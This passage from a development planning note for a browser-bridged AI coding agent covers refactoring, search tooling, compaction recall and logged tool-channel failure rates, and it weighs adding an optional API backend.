  signature instead of as seventeen implicit `this.` references. 1,910 → 1,594 lines, interface
  unchanged. This is what unblocks generating the tool definitions: `ask_question`,
  `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory` are still dispatched from
  inside `agent-loop.js` and need declaring somewhere first.
- A **symbol index** — `find_symbol` / `find_references`, from tree-sitter or ctags. The
  structural half of what a large codebase needs, and the half grep is worst at.

### Raised, not yet planned

Two things the owner asked to come back to once the phases were done:

**Session logs as post-compaction recall.** Compaction replaces older turns with a summary, and
anything it dropped is gone from the model's view — but not from disk: `sessions/history.jsonl`
still holds every turn. A tool that lets the model look back into its own history would turn
"compaction ate the detail" from a loss into a lookup. Probably better than making compaction
smarter, because it does not require deciding in advance what will matter.

**Search for really large codebases.** `grep_search` now takes several patterns, context lines
and groups by file (P2), and the reasoning for *not* adding an index is recorded above. That
decision was made from the architecture, not from measurement — the next codebase is the
measurement.

**The extension.** Chrome throttling of background tabs, the retry behaviour around it, and
whatever else the bridge is papering over. Raised 2026-09-11, to be planned rather than patched.
**Answered 2026-09-17** — see "Bridge liveness" above, and "The clock was the only throttled
thing" below.

**`/skills` needs a proper look.** The list is aligned and reachable from settings now, and
escape steps back — but the shape of the feature was not examined. `/skills dir` prints a
four-entry search path; `skillFolders` is an escape hatch from config; creating one opens an
editor. Whether that is the right set of moves is an open question, not a bug list.

### The fork

The agent layer's ceiling is not code quality, it is the absence of a tool-call API. Three
responses, ascending:

**A. Make the text channel as good as it gets** — P1's validation plus a sentinel-delimited
call block. Free, no product decisions.

**B. Measure before believing.** `parse_tool_calls`, `tool_amnesia`, `provider_error` and
`multiple_drafts` are logged, and **`/logs rates` reads them back as rates** —
`core/channel-health.js`, gated at `MIN_TURNS_FOR_RATE` so a handful of turns cannot look like
a trend. This note used to say nothing read them; that stopped being true and the note did not
follow, which nearly bought a second implementation of a view that already shipped.

First real reading, 99 turns on the owner's machine: unparseable tool call **0%**, denied
having tools **1.0%**, provider error **0%**, multiple drafts **0%**. The text channel is in
better shape than the estimates in this file assume — which is the point of having the number
rather than the estimate.

**Second reading, 350 turns, 2026-09-26 — and it closes two gated items.**

    unparseable tool call     0.3%   1     last seen 09-20
    denied having tools       0.3%   1     last seen 09-17
    provider error            1.4%   5     Gemini's own errors, not ours
    multiple drafts           0.0%   0
    unverified handover       2.6%   9     last seen 09-20
    concluded before evidence 0.0%   0
    first turn answered blind 0.3%   1     last seen 09-24

**Read the dates, not the rates.** Every lifetime percentage above is carried
by a cluster that has since stopped. `handover_unsupported` is 7 on 09-19 and 2
on 09-20 and **nothing in the six days since**; `tool_amnesia` fired once, on
09-17, nine days ago. A rate computed over all time describes a product that no
longer exists.

- **D1 (handover-audit teeth) is closed, not done.** Its signal stopped six days
  before the work would have started. Building enforcement for a failure that
  has stopped happening is how a system accumulates rules nobody can remove.
- **D3 (turn-0 bootstrap) is closed too.** The 09-22 branch was explicit —
  *15–25% → do D3; near 0% → the prompts need nothing* — and the reading is
  **0.3%, one occurrence**, which `e28` then showed was a false positive
  (`isFirstReply` stays true through every tool round). Zero real cases.
- **C4 (delegation nudge) could not be read at all, and that was the finding.**
  `_extractToolCalls` strips tool calls out of a reply before the cleaned text
  reaches `history.jsonl`, so the delegation rate is unrecoverable after the
  fact: a probe over every stored session returned `0 of 2790`, and all 2790
  were `"name"` keys inside tool *results*. The one-off *41 sessions, 529 calls*
  figure this file quotes was never repeatable. `core/tool-usage.js` records it
  now, one row per turn from the tally `_turnEvidence` already keeps; `/logs
  tools` reads it back, with `neverCalled` taken from the **catalog** rather
  than from the log, because a list of what was seen cannot contain what was
  not.

**C. An optional API backend.** The only option that actually removes the ceiling: structured
calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of `PromptBuilder`'s
economics become dead code. It contradicts the standing "no API keys" decision above, so it is
recorded as a fork, not a plan. The framing that preserves the thesis: the browser bridge stays
the default and the identity of the project; an API backend is opt-in for people who already
have a key.
